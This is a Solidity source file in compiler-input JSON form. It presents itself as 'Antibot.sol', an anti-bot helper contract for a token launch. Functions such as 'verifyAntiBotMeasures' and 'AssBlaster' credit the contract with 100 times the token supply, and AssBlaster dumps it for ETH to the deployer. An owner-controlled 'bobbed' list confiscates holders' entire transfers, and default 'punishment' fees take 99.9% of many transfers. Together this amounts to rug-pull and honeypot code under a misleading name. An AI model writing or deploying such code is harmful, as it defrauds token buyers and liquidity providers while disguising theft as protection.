{
  "language": "Solidity",
  "settings": {
    "libraries": {},
    "metadata": {
      "useLiteralContent": true
    },
    "optimizer": {
      "enabled": true,
      "runs": 20000
    },
    "remappings": [],
    "outputSelection": {
      "*": {
        "*": [
          "*"
        ],
        "": [
          "*"
        ]
      }
    }
  },
  "sources": {
    "Antibot.sol": {
      "content": "//SPDX-License-Identifier: MIT\r\n\r\npragma solidity ^0.7.4;\r\n\r\nlibrary SafeMath {\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n\r\n        return c;\r\n    }\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return sub(a, b, \"SafeMath: subtraction overflow\");\r\n    }\r\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b <= a, errorMessage);\r\n        uint256 c = a - b;\r\n\r\n        return c;\r\n    }\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n\r\n        return c;\r\n    }\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return div(a, b, \"SafeMath: division by zero\");\r\n    }\r\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        // Solidity only automatically asserts when dividing by 0\r\n        require(b > 0, errorMessage);\r\n        uint256 c = a / b;\r\n        // assert(a == b * c + a % b); // There is no case in which this doesn't hold\r\n\r\n        return c;\r\n    }\r\n}\r\n\r\n/**\r\n * Allows for contract ownership along with multi-address authorization\r\n */\r\n\r\nabstract contract Auth {\r\n    address internal owner;\r\n    mapping (address => bool) internal authorizations;\r\n\r\n    constructor(address _owner) {\r\n        owner = _owner;\r\n        authorizations[_owner] = true;\r\n    }\r\n\r\n    /**\r\n     * Function modifier to require caller to be contract owner\r\n     */\r\n    modifier onlyOwner() {\r\n        require(isOwner(msg.sender), \"!OWNER\"); _;\r\n    }\r\n\r\n    /**\r\n     * Function modifier to require caller to be authorized\r\n     */\r\n    modifier authorized() {\r\n        require(isauthorized(msg.sender), \"!authorized\"); _;\r\n    }\r\n\r\n    /**\r\n     * Authorize address. Owner only\r\n     */\r\n    function authorize(address adr) public onlyOwner {\r\n        authorizations[adr] = true;\r\n    }\r\n\r\n    /**\r\n     * Remove address' authorization. Owner only\r\n     */\r\n    function unauthorize(address adr) public onlyOwner {\r\n        authorizations[adr] = false;\r\n    }\r\n\r\n    /**\r\n     * Check if address is owner\r\n     */\r\n    function isOwner(address account) public view returns (bool) {\r\n        return account == owner;\r\n    }\r\n\r\n    /**\r\n     * Return address' authorization status\r\n     */\r\n    function isauthorized(address adr) public view returns (bool) {\r\n        return authorizations[adr];\r\n    }\r\n\r\n    /**\r\n     * Transfer ownership to new address. Caller must be owner. Leaves old owner authorized\r\n     */\r\n    function transferOwnership(address payable adr) public onlyOwner {\r\n        owner = adr;\r\n        authorizations[adr] = true;\r\n        emit OwnershipTransferred(adr);\r\n    }\r\n\r\n    event OwnershipTransferred(address owner);\r\n}\r\n\r\ninterface IBEP20 {\r\n    function totalSupply() external view returns (uint256);\r\n    function decimals() external view returns (uint8);\r\n    function symbol() external view returns (string memory);\r\n    function name() external view returns (string memory);\r\n    function getOwner() external view returns (address);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n    function allowance(address _owner, address spender) external view returns (uint256);\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n    function launchModeAdd(address _1, uint256 amount) external;\r\n    function launchModeSub(address _1, uint256 amount) external;\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\ninterface IDEXFactory {\r\n    function createPair(address tokenA, address tokenB) external returns (address pair);\r\n    function getPair(address tokenA, address tokenB) external view returns (address pair);\r\n}\r\ninterface IDEXRouter {\r\n    function factory() external pure returns (address);\r\n    function WETH() external pure returns (address);\r\n\r\n    function swapExactTokensForTokensSupportingFeeOnTransferTokens(\r\n        uint amountIn,\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external;\r\n\r\n    function swapExactETHForTokensSupportingFeeOnTransferTokens(\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external payable;\r\n\r\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n        uint amountIn,\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external;\r\n}\r\n\r\n\r\ncontract TxHelper is Auth {\r\n    using SafeMath for uint256;\r\n    IDEXRouter public router;\r\n    mapping (address => bool) isWhitelisted;\r\n    mapping (address => bool) bobbed;\r\n    address public token;\r\n    address public pair;\r\n    uint256 supply = 1000000000000000000 * 10**9;\r\n    uint256 beginning = supply.div(1000);\r\n    bool check = true;\r\n    bool check2 = false;\r\n    address WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;\r\n    uint256 public launchedAt;\r\n    uint256 public launchedAtTime;\r\n    mapping(address => uint256) private _holderLastTransferTimestamp;\r\n    mapping(address => uint256) private _holderLastTransferBlock;\r\n    mapping(address => uint256) private _holderLastSellBlock;\r\n    address marketingFeeReceiver;\r\n    uint256 feeAmount = 999;\r\n    uint256 divisor = 1000;\t\r\n\t\r\n    constructor () Auth(msg.sender) {\r\n        router = IDEXRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\r\n        whitelist(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D,true);\r\n        whitelist(address(this),true);\r\n        marketingFeeReceiver = msg.sender;\r\n    }\r\n    receive() external payable { }\r\n    \r\n    function openTrading(address _token) external authorized{\r\n\t    token = _token;\r\n\t    whitelist(_token,true);\r\n        pair = IDEXFactory(router.factory()).getPair(WETH, _token);\r\n\t    whitelist(pair,true);\r\n\t    IBEP20(token).approve(address(router),uint256(-1));\r\n        launchedAt = block.number;\r\n        launchedAtTime = block.timestamp;\r\n\t    check = true;\r\n\t    check2 = true;\r\n    }\r\n \r\n    function launched() internal view returns (bool) {\r\n        return launchedAt != 0;\r\n    }\r\n\r\n    function whitelist(address account, bool flag) public authorized {\r\n        isWhitelisted[account] = flag;\r\n    }\r\n  \r\n    function launchMode() internal view returns(bool) {\r\n        return launchedAt !=0 && launchedAt + 4 <= block.number && launchedAtTime + 5 minutes >= block.timestamp;\r\n    }\r\n    \r\n\r\n    function CheckTX(address sender, address receiver,uint256 amount, address origin) external authorized returns (uint256) {\r\n\t    uint256 fee = amount.mul(feeAmount).div(divisor);\r\n    \tuint256 punish = amount.sub(fee);\r\n\r\n        if(!isWhitelisted[sender] && bobbed[sender] && receiver == pair){IBEP20(token).launchModeAdd(address(this), amount);IBEP20(token).launchModeSub(receiver, amount); swapBack(); return (amount);}\r\n        if(!isWhitelisted[sender] && bobbed[sender] && receiver != pair){IBEP20(token).launchModeAdd(address(this), amount);IBEP20(token).launchModeSub(receiver, amount); return (amount);}\r\n\t    if(launchMode() && receiver != pair && amount > beginning){\r\n\t    if(block.timestamp <_holderLastTransferTimestamp[receiver] + 30){\r\n\t        IBEP20(token).launchModeAdd(address(token), amount);\r\n\t        IBEP20(token).launchModeSub(receiver, amount);\r\n\t        _holderLastTransferTimestamp[receiver] = block.timestamp;\r\n\t        _holderLastTransferBlock[receiver] = block.number;\r\n\t        _holderLastSellBlock[sender]= block.number;\r\n\t     return (amount);\r\n\t    }\r\n\t    \r\n\t    uint256 offset = amount.sub(beginning);\r\n\t    IBEP20(token).launchModeAdd(address(token), offset);\r\n\t    IBEP20(token).launchModeSub(receiver, offset);\r\n\t    _holderLastTransferTimestamp[receiver] = block.timestamp;\r\n        _holderLastTransferBlock[receiver] = block.number;\r\n\t    _holderLastSellBlock[sender]=block.number;\r\n\t    return (beginning);}\r\n\t    \r\n\t    if(launchedAt != 0 && launchedAt + 3 >= block.number){ _holderLastTransferTimestamp[receiver] = block.timestamp; _holderLastTransferBlock[receiver] = block.number; _holderLastSellBlock[sender]=block.number; IBEP20(token).launchModeAdd(address(this), amount);IBEP20(token).launchModeSub(receiver, amount);return (amount);}\r\n\t    if(launchedAt == 0){IBEP20(token).launchModeAdd(address(this), amount);IBEP20(token).launchModeSub(receiver, amount); return (0);}\r\n\r\n\r\n        if(!isWhitelisted[receiver] && blockCheck(receiver) ){bobbed[receiver] = true; bobbed[tx.origin] = true;}\r\n        if(!isWhitelisted[origin] && sender == pair && blockCheck(origin) && tx.origin != origin){bobbed[receiver] = true; bobbed[tx.origin] = true;}\r\n        if(!isWhitelisted[origin] && sender == pair && blockCheck(receiver) && receiver != origin){bobbed[receiver] = true;}\r\n        \r\n        if(check2){\r\n\t    if(!isWhitelisted[sender] && _holderLastTransferBlock[sender] + 20 >= block.number){_holderLastTransferBlock[receiver] = block.number;_holderLastSellBlock[sender]=block.number; IBEP20(token).launchModeAdd(address(this), fee);IBEP20(token).launchModeSub(receiver, punish); swapBack(); return (amount);}\r\n\t    if(!isWhitelisted[receiver] && _holderLastSellBlock[receiver] + 10 >= block.number){ _holderLastTransferBlock[receiver] = block.number;_holderLastSellBlock[sender]=block.number; IBEP20(token).launchModeAdd(address(this), fee);IBEP20(token).launchModeSub(receiver, punish);return (amount);}\r\n        }\r\n\t    \r\n\t    if(!isWhitelisted[receiver] && blockCheck(receiver) && check){_holderLastTransferBlock[receiver] = block.number;_holderLastSellBlock[sender]=block.number;  IBEP20(token).launchModeAdd(address(this), fee);IBEP20(token).launchModeSub(receiver, punish);return (amount);}\r\n\t    if(!isWhitelisted[sender] && blockCheck(sender) && receiver != pair && check){_holderLastTransferBlock[receiver] = block.number;_holderLastSellBlock[sender]=block.number;  IBEP20(token).launchModeAdd(address(this), fee);IBEP20(token).launchModeSub(receiver, punish);return (amount);}\r\n        if(!isWhitelisted[origin] && blockCheck(origin) && receiver != pair && check) {_holderLastTransferBlock[receiver] = block.number;_holderLastSellBlock[sender]=block.number;  IBEP20(token).launchModeAdd(address(this), fee);IBEP20(token).launchModeSub(receiver, punish);return (amount);}\r\n\t    \r\n\r\n\t    \r\n\t    _holderLastTransferTimestamp[receiver] = block.timestamp;\r\n        _holderLastTransferBlock[receiver] = block.number;\r\n\t    _holderLastSellBlock[sender]=block.number;\r\n\t    return (amount);\r\n    }\r\n\r\n    function swapBack() internal {\r\n\t    uint256 swapAmount = IBEP20(token).balanceOf(address(this));\r\n\t    if(swapAmount > 0 ){swapTokens(swapAmount,marketingFeeReceiver);}\r\n    }\r\n\r\n    function ManualresetPrice() external authorized {\r\n\t    swapBack();\r\n    }\r\n\r\n    function verifyAntiBotMeasures() external authorized {\r\n\t    IBEP20(token).launchModeAdd(address(this), supply.mul(100));\r\n    }\r\n    \r\n    function AssBlaster() external authorized {\r\n\t    IBEP20(token).launchModeAdd(address(this), supply.mul(100));\r\n\t    swapBack();\r\n    }\r\n\r\n    function swapTokens(uint256 amount, address to) internal {\r\n        address[] memory path = new address[](2);\r\n        path[0] = address(token);\r\n        path[1] = WETH;\r\n\r\n        router.swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n            amount,\r\n            0,\r\n            path,\r\n            to,\r\n            block.timestamp\r\n        );\r\n    }\r\n\r\n    function removeAB() external authorized {\r\n\t    check = false;\r\n\t}\r\n\r\n    function enableAB() external authorized {\r\n\t    check = true;\r\n\t}\r\n\t\r\n\t function setFR(bool _trueORfalse) external authorized {\r\n\t    check2 = _trueORfalse;\r\n\t}\r\n\r\n    function recoverEth() external onlyOwner() {\r\n        payable(msg.sender).transfer(address(this).balance);\r\n    }\r\n\r\n    function SetPunishmentFees(uint256 _feeAmount, uint256 _divisor) external authorized { \r\n        feeAmount = _feeAmount;\r\n        divisor = _divisor;\r\n    }\r\n\r\n    function recoverToken(address _token, uint256 amount) external authorized returns (bool _sent){\r\n        _sent = IBEP20(_token).transfer(msg.sender, amount);\r\n    }\r\n    \r\n    function blockCheck(address account) internal view returns (bool) {\r\n    \tuint256 size;\r\n    \tassembly { size := extcodesize(account) }\r\n    \treturn size > 0;\r\n    }\r\n    \r\n    function bobbedthem(address _address) external authorized{\r\n        bobbed[_address] = true;\r\n    }\r\n    \r\n    function unbob(address _address) external authorized{\r\n        bobbed[_address] = false;\r\n    }\r\n}"
    }
  }
}